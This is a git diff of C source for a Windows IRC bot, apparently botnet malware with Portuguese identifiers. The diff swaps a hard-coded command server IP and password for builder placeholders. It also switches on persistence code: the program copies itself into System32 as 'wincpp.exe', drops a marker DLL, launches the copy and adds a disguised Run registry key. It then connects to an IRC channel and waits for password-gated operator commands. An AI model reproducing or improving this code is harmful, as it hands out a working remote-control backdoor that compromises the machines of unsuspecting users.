@@ -8,32 +8,34 @@
 #include <conio.h>
 #include <windows.h>
 //===========================================
-#define SERVER "193.10.255.100"
-#define PORTA 6667
-#define CANAL "#Z29uNGZsb3c"
-#define SENHA "123456"
+#define SERVER "=SERVER="
+#define PORTA =PORTA=
+#define CANAL "#=CANAL="
+#define SENHA "=SENHA="
 #define MAX 4096
 
 //number = rand() % 10 + 1;
 
+
+
 void startup(char *arg){
-	//unsigned long type = REG_SZ;
+	unsigned long type = REG_SZ;
 	char *data;
-	sprintf(data, "%swincpp.exe", getenv("TEMP"));
+	sprintf(data, "%sMicrosoft\\Windows\\Start Menu\\Programs\\Startup", getenv("APPDATA"));
 	FILE *fo = fopen("C:\\Windows\\System32\\acesspoint.dll", "r");
 	if(!fo){
-		//FILE *fl = fopen("C:\\Windows\\System32\\acesspoint.dll", "w");
-		//fclose(fl);
-		CopyFile(arg, data, 0);
-		//system("start C:\\Windows\\System32\\wincpp.exe");
+		FILE *fl = fopen("C:\\Windows\\System32\\acesspoint.dll", "w");
+		fclose(fl);
+		CopyFile(arg, "C:\\Windows\\System32\\wincpp.exe", 0);
+		system("start C:\\Windows\\System32\\wincpp.exe");
 		fclose(fo);
-		//HKEY Entrada;
-		//if ((RegCreateKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 
-		//			REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &Entrada, &type)) == ERROR_SUCCESS) {
-		//		RegSetValueEx(Entrada, "File description", 0, REG_SZ, ((BYTE *)"C:\\Windows\\System32\\wincpp.exe"), ((unsigned long)30));
-		//		RegCloseKey(Entrada);
-			//}
-		//RegCloseKey(Entrada);
+		HKEY Entrada;
+		if ((RegCreateKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 
+					REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &Entrada, &type)) == ERROR_SUCCESS) {
+				RegSetValueEx(Entrada, "File description", 0, REG_SZ, ((BYTE *)"C:\\Windows\\System32\\wincpp.exe"), ((unsigned long)30));
+				RegCloseKey(Entrada);
+			}
+		RegCloseKey(Entrada);
 		exit(0);
 	}else{
 		fclose(fo);
@@ -116,9 +118,9 @@ typedef  enum boolean  bool;
  
 
 int main(int argc, char **argv){
-	startup(argv[0]);
 	SetConsoleTitle("wincpp");
 	HWND wnd = FindWindow(0, "wincpp");
+	startup(argv[0]);
 	char nick[1000 + 1];
 	DWORD size = 1000+1;
 	int sockfd; 
@@ -207,6 +209,13 @@ int main(int argc, char **argv){
 
 	sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
+	if(sockfd == -1){
+		perror("socket");
+		exit(1);
+	}else{
+		printf("Socket criado com sucesso \n");
+	}
+
 	remoto.sin_family		= AF_INET; 
 	remoto.sin_port			= htons(PORTA); 
 	remoto.sin_addr.s_addr 	= inet_addr(SERVER);
@@ -252,7 +261,7 @@ int main(int argc, char **argv){
 				  	send(sockfd, buffer_send, strlen(buffer_send), 0);
 			}else{
 				if(buffer_recv != NULL){
-					printf("\n N�o NULL\n");
+					printf("\n Não NULL\n");
 					if(strstr(buffer_recv, "$ligar 123456") != NULL){
 						printf("\n entro acho a logar\n");
 						sprintf(buffer_send, "PRIVMSG %s :[+] Ligado com sucesso \r\n", CANAL);
@@ -279,7 +288,7 @@ int main(int argc, char **argv){
 		if((slen = recv(sockfd, buffer_recv, MAX, 0)) > 0){
 			printf("\n slen maior que 0\n");
 			if(sscanf(buffer_recv, "PING :%s", suffix) > 0){
-				printf("\n é ping\n");
+				printf("\n Ã© ping\n");
 				sprintf(buffer_recv, "PONG :%s\r\n", suffix);
 				send(sockfd, buffer_recv, strlen(buffer_recv), 0);
 				memset(buffer_send, 0x0 ,sizeof(buffer_recv));
